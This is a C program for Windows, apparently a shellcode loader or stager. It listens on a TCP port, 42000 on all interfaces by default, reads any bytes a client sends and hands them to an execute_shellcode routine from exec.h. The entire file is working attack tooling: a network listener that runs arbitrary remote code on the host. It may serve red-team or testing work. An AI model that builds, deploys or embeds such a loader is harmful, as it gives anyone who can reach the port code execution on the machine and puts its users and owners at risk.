#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "exec.h"

#pragma comment(lib, "ws2_32.lib")

void print_help(char *progName) {
    printf("Usage: %s [options]\n", progName);
    printf("Options:\n");
    printf("  --port <port>             Specify the port number to listen on (default: 42000)\n");
    printf("  --ip <address>            Specify the IP address to bind to (default: 0.0.0.0)\n");
    printf("  --interactive             Run in interactive mode (default: non-interactive)\n");
    printf("  --help                    Display this help and exit\n");
}

int parse_args(int argc, char *argv[], int *port, char **ip, int *interactive) {
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--help") == 0) {
            print_help(argv[0]);
            return 0;
        } else if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) {
            *port = atoi(argv[i + 1]);
            i++; // Skip next argument since it's part of the current option
        } else if (strcmp(argv[i], "--ip") == 0 && i + 1 < argc) {
            *ip = argv[i + 1];
            i++;
        } else if (strcmp(argv[i], "--interactive") == 0) {
            *interactive = 1;
        } else {
            fprintf(stderr, "Unknown option: %s\n", argv[i]);
            print_help(argv[0]);
            return 0;
        }
    }
    return 1;
}
int main(int argc, char *argv[]) {
    WSADATA wsaData;
    SOCKET serverSocket, clientSocket;
    struct sockaddr_in server, client;
    int port = 42000;
    char *ip = "0.0.0.0";
    int c;
    char buffer[1024];
    int bytesRead;
    int interactive = 0;

    if (!parse_args(argc, argv, &port, &ip, &interactive)) {
        return 0; // Exit if help is displayed or on parse error
    }

    // Parse command line arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) {
            port = atoi(argv[i + 1]);
        } else if (strcmp(argv[i], "--ip") == 0 && i + 1 < argc) {
            ip = argv[i + 1];
        } else if (strcmp(argv[i], "--interactive") == 0) {
            interactive = 1;
        }
    }

    printf("[*] Parent PID: %d\n", GetCurrentProcessId());

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("[!] Failed to initialize Winsock: %d\n", WSAGetLastError());
        return 1;
    }

    // Create socket
    if ((serverSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("[!] Could not create socket: %d\n", WSAGetLastError());
        return 1;
    }

    // Prepare the sockaddr_in structure
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(port);

    // Bind
    if (bind(serverSocket, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("[!] Bind failed with error code: %d\n", WSAGetLastError());
        closesocket(serverSocket);
        return 1;
    }

    // Listen to incoming connections
    listen(serverSocket, 3);

    // Accept incoming connections
    printf("[*] Waiting for incoming connections on %s:%d\n", ip, port);
    c = sizeof(struct sockaddr_in);

    while ((clientSocket = accept(serverSocket, (struct sockaddr *)&client, &c)) != INVALID_SOCKET) {
        printf("[+] Connection accepted.\n");

        // Receive data from the client
        unsigned char *receivedData = malloc(4096);
        int totalBytesRead = 0;
        while ((bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0)) > 0) {
            receivedData = realloc(receivedData, totalBytesRead + bytesRead);
            memcpy(receivedData + totalBytesRead, buffer, bytesRead);
            totalBytesRead += bytesRead;
        }

        if (bytesRead == SOCKET_ERROR) {
            printf("[!] recv failed with error code: %d\n", WSAGetLastError());
        } else {
            printf("[+] Shellcode received. Total size: %d bytes\n", totalBytesRead);
            execute_shellcode(receivedData, totalBytesRead, interactive);
            free(receivedData);
        }

        closesocket(clientSocket);
    }

    if (clientSocket == INVALID_SOCKET) {
        printf("[!] accept failed with error code: %d\n", WSAGetLastError());
    }

    closesocket(serverSocket);
    WSACleanup();
    return 0;
}
